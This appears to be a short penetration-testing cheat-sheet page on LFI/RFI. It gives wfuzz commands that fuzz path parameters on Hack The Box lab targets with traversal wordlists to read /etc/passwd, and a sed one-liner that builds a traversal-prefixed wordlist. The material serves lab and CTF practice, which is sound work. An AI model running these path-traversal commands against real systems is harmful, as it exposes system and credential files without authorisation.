# LFI/RFI

### Practical Steps

{% code overflow="wrap" %}
```bash
# Attempt to fuzz /etc/password with dotdotpwn wordlist
wfuzz -w lfi/LFI-medium-dotdotpwn.txt -u 'https://broscience.htb/includes/img.php?path=FUZZ' -c --hh 30,0

# Attempt to fuzz /etc/password with large wordlist
wfuzz -w lfi/LFI-long.txt -u 'https://broscience.htb/includes/img.php?path=FUZZ' -c --hh 30,0

# Prepare better wordlist with the pattern we discoverd with dotdotpwn. This sed command will add '../../../../../..' to each LFI test pattern. 
sed 's/^/..\/..\/..\/..\/..\/../' lfi/LFI-short-crimson.txt > lfi/LFI-short-crimson_new.txt

# Check LFI
wfuzz -w lfi/LFI-short-crimson_new.txt -u 'http://10.129.231.92:8080/show_image?img=FUZZ' -c --hh 431,0
```
{% endcode %}
